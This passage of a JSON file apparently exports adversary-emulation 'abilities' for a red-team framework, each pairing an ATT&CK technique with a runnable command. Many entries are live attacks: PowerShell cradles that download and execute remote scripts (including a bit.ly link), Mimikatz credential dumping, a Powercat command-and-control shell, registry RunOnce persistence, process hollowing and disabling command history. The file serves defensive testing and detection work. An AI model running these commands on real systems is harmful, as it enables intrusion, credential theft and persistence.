"timeout": 60, "build_target": null, "platform": "windows", "command": "$RunOnceKey = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; set-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "3c0760559a620aad7664cdf98f486127", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "PowerShell Registry RunOnce", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Connect to a remote powershell session and interact with the host.\nUpon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Try {;     New-PSSession -ComputerName $env:COMPUTERNAME -ErrorAction Stop | Out-Null;      ; } ; Catch {;     Enable-PSRemoting; };  ;  New-PSSession -ComputerName $env:COMPUTERNAME; Test-Connection $env:COMPUTERNAME; Set-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"; Get-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use; Remove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "bba7fe7940f8719efa3c38e54ec79e2c", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "PowerShell Session Creation and Use", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Download", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\")", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "bfff9006-d1fb-46ce-b173-92cb04e9a031", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "PowerShell bitly Link Download", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "System Information Gathering Script", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "702bfdd2-9947-4eda-b551-c3a1ea9a59a2", "technique_id": "T1059.001", "tactic": "collection", "requirements": [], "name": "PowerShell information gathering", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Discover the PowerShell version", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$PSVersionTable", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$PSVersionTable", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "29451844-9b76-4e16-a9ee-d6feab4b24db", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "PowerShell version", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Check for privilege escalation paths using PowerUp from PowerShellMafia\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "ba763ea19604a73e3e1f9d9d8d86d9cc", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "PowerUp Invoke-AllChecks", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path $env:TEMP\\PowerView.ps1) { ; } else {Invoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile $env:TEMP\\PowerView.ps1};  ;  Import-Module $env:TEMP\\PowerView.ps1; Invoke-ShareFinder -CheckShareAccess", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Network Share Discovery", "ability_id": "8f17c5e3ca9e2db88111d002c811ddac", "technique_id": "T1135", "tactic": "discovery", "requirements": [], "name": "PowerView ShareFinder", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1'); powercat -c", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Non-Application Layer Protocol", "ability_id": "981cf81e3bb0649fafc31217c8cbc00d", "technique_id": "T1095", "tactic": "command-and-control", "requirements": [], "name": "Powercat C2", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use Invoke-Mimikatz", "repeatable": false, "privilege": "Elevated", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["invoke-mimi.ps1"], "parsers": [{"module": "plugins.stockpile.app.parsers.katz", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_password", "target": "domain.user.password", "source": "domain.user.name"}, {"custom_parser_vals": {}, "edge": "has_hash", "target": "domain.user.ntlm", "source": "domain.user.name"}, {"custom_parser_vals": {}, "edge": "has_hash", "target": "domain.user.sha1", "source": "domain.user.name"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSASS Memory", "ability_id": "7049e3ec-b822-4fdf-a4ac-18190f9b66d1", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "Powerkatz (Staged)", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Unregister-ScheduledTask -TaskName \"AtomicTask\" -confirm:$false >$null 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTask -InputObject $object", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Scheduled Task", "ability_id": "ba8ddc38c7c6ced12fecc0d695c5e57c", "technique_id": "T1053.005", "tactic": "multiple", "requirements": [], "name": "Powershell Cmdlet Scheduled Task", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use the PowerShell to execute COM CLSID object.\nReference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Get-Process -Name \"*calc\" | Stop-Process"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\")); $item = $o.Item(); $item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Component Object Model Hijacking", "ability_id": "d94bcdfc9d0f769b062e1960f7af6804", "technique_id": "T1546.015", "tactic": "multiple", "requirements": [], "name": "Powershell Execute COM Object", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSASS Memory", "ability_id": "87601246abde270b512d08c868c03bfb", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "Powershell Mimikatz", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "fe19a5f38374d4f46032ee18ac1aa474", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "Powershell MsXml COM object - with prompt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Powershell xml download request. Upon execution, \"Download Cradle test success!\" will be dispalyed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "724693bb7a55fdc94d84bd52d58c60b7", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "Powershell XML requests", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Import-Module \"$env:TEMP\\PowerView.ps1\"; Get-NetDomainTrust; Get-NetForestTrust; Get-ADDomain; Get-ADGroupMember Administrators -Recursive; ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Domain Trust Discovery", "ability_id": "109b73cd939f52db23f842589138d79c", "technique_id": "T1482", "tactic": "discovery", "requirements": [], "name": "Powershell enumerate domains and forests", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "b7dbd4b15fb43757def1ccebfc02b350", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "Powershell invoke mshta.exe download", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "See the most used WIFI networks of a machine", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["wifi.sh"], "parsers": [{"module": "plugins.stockpile.app.parsers.wifipref", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "wifi.network.ssid"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "./wifi.sh pref", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["wifi.sh"], "parsers": [{"module": "plugins.stockpile.app.parsers.wifipref", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "wifi.network.ssid"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "./wifi.sh pref", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["wifi.ps1"], "parsers": [{"module": "plugins.stockpile.app.parsers.wifipref", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "wifi.network.ssid"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": ".\\wifi.ps1 -Pref", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69", "technique_id": "T1016", "tactic": "discovery", "requirements": [{"relationship_match": [{"source": "scan.info"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Preferred WIFI", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "See the most used WIFI networks of a machine", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["wifi.sh"], "parsers": [{"module": "plugins.stockpile.app.parsers.wifipref", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "wifi.network.ssid"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "./wifi.sh pref", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["wifi.sh"], "parsers": [{"module": "plugins.stockpile.app.parsers.wifipref", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "wifi.network.ssid"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "./wifi.sh pref", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["wifi.ps1"], "parsers": [{"module": "plugins.stockpile.app.parsers.wifipref", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "wifi.network.ssid"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": ".\\wifi.ps1 -Pref", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "d04f015d-1146-4bd9-a8bb-096bc60eaedf", "technique_id": "T1016", "tactic": "discovery", "requirements": [{"relationship_match": [{"source": "scan.info"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Preferred WIFI (2)", "plugin": ""}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "See the most used WIFI networks of a machine", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["wifi.sh"], "parsers": [{"module": "plugins.stockpile.app.parsers.wifipref", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "wifi.network.ssid"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "./wifi.sh pref", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["wifi.sh"], "parsers": [{"module": "plugins.stockpile.app.parsers.wifipref", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "wifi.network.ssid"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "./wifi.sh pref", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["wifi.ps1"], "parsers": [{"module": "plugins.stockpile.app.parsers.wifipref", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "wifi.network.ssid"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": ".\\wifi.ps1 -Pref", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "9e93a13a-281b-45fd-97d8-4db1842b5065", "technique_id": "T1016", "tactic": "discovery", "requirements": [{"relationship_match": [{"source": "scan.info"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Preferred WIFI (2)", "plugin": ""}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Prevents Powershell history\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Set-PSReadLineOption -HistorySaveStyle SaveIncrementally"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-PSReadlineOption -HistorySaveStyle SaveNothing", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Command History", "ability_id": "df94858e92a23d274ac1d70133d9150f", "technique_id": "T1070.003", "tactic": "defense-evasion", "requirements": [], "name": "Prevent Powershell History Logging", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Print the current working directory on the system", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "pwd", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "pwd", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "pwd", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "File and Directory Discovery", "ability_id": "6e1a53c0-7352-4899-be35-fa7f364d5722", "technique_id": "T1083", "tactic": "discovery", "requirements": [], "name": "Print Working Directory", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create a ZIP file from a folder in a remote drive\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %TEMP%\\PrintBrm.zip >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "del %TEMP%\\PrintBrm.zip >nul 2>&1  && C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -b -d \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\  -f %TEMP%\\PrintBrm.zip -O FORCE", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "060cb51c43467792396a7ba1e9ed087b", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Printer Migration Command-Line Tool UNC share folder into a zip file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "dir c:\\ /b /s .key | findstr /e .key", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Private Keys", "ability_id": "e16297dffb68b5ffa5b243243233cd1c", "technique_id": "T1552.004", "tactic": "credential-access", "requirements": [], "name": "Private Keys", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-Process", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "1d48fc4147a7bcd47bdf60db7dde9640", "technique_id": "T1057", "tactic": "discovery", "requirements": [], "name": "Process Discovery - Get-Process", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "get-wmiObject -class Win32_Process", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "1ddf2b8ee6a56ce9f9132a168947653e", "technique_id": "T1057", "tactic": "discovery", "requirements": [], "name": "Process Discovery - get-wmiObject", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/loot.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ps >> /tmp/loot.txt; ps aux >> /tmp/loot.txt", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/loot.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ps >> /tmp/loot.txt; ps aux >> /tmp/loot.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "453b8d81c6118310308fb5b22de12235", "technique_id": "T1057", "tactic": "discovery", "requirements": [], "name": "Process Discovery - ps", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "tasklist", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "f8de05d1741dcc468f772ab0ff4dac72", "technique_id": "T1057", "tactic": "discovery", "requirements": [], "name": "Process Discovery - tasklist", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize windows management instrumentation to identify processes.\n\nUpon successful execution, WMIC will execute process to list processes. Output will be via stdout. \n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic process get /format:list", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "b2a1e430ca6d36eb5af2fe666e769847", "technique_id": "T1057", "tactic": "discovery", "requirements": [], "name": "Process Discovery - wmic process", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["cd6d01_Start-Hollow.ps1"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Stop-Process -Name \"notepad\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": ". cd6d01_Start-Hollow.ps1; $ppid=Get-Process explorer | select -expand id; Start-Hollow -Sponsor \"C:\\Windows\\System32\\notepad.exe\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Injection: Process Hollowing", "ability_id": "90d152c066fad4dc7d54b9a9e4443b50", "technique_id": "T1055.012", "tactic": "multiple", "requirements": [], "name": "Process Hollowing using PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Process Injection using C#\nreference: https://github.com/pwndizzle/c-sharp-memory-injection\nExcercises Five Techniques\n1. Process injection\n2. ApcInjectionAnyProcess\n3. ApcInjectionNewProcess\n4. IatInjection\n5. ThreadHijack\nUpon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, 